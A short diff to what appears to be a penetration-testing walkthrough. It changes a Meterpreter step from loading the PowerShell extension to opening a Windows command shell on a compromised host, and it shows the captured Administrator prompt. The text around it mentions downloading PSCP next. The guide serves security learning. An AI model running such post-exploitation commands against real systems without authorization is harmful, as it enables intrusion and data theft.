@@ -454,9 +454,13 @@ service ssh status
 Now, let's get back to the meterpreter> console and load powershell module:
 
 ```bash
-meterpreter > load powershell
-Loading extension powershell...Success.
-meterpreter > powershell_shell
+meterpreter > shell
+Process 6388 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Downloads>
 ```
 
 Then start to download `PSCP` using the following command:
